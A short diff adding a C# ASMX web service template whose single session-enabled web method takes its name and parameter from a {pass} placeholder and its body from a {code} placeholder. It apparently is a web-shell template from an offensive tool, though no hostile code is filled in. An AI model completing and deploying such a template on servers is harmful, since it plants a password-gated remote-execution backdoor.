@@ -1,0 +1,20 @@
+<%@ WebService Language="C#" Class="WebService1" %>
+using System;
+using System.Collections;
+
+[Serializable]
+public class WebService1 : MarshalByRefObject
+{
+    private static Hashtable session = new Hashtable();
+
+    public WebService1()
+    {
+
+    }
+
+    [System.Web.Services.WebMethod(EnableSession = true)]
+    public string {pass}(string {pass})
+    {
+        {code}
+    }
+}
